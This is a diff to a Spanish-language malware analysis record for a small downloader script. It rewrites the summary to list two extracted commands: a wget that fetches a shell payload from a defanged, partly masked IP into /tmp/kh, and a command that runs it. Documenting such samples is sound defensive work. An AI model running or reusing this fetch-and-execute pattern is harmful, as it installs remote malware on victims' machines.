@@ -4,7 +4,10 @@
 
 ## 📌 Resumen
 
-Artefacto identificado como ASCII text, with CRLF line terminators de 203 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `sh` en `hxxp://109.104.153.XXX/sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+Texto ASCII de 203 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `sh` en `hxxp://109.104.153.XXX/sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**
+
+1. `sh /tmp/kh'$`
+2. `wget hxxp://109.104.153.XXX/sh -O -> /tmp/kh` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/a0b248dd85e7226f7e96a23d6c15085c349217f47e09afbeb1785f31c71922a1.md](../../../../../malware-like/oraculo/downloader/a0b248dd85e7226f7e96a23d6c15085c349217f47e09afbeb1785f31c71922a1.md)
 
 
 ## 🏷️ Clasificación
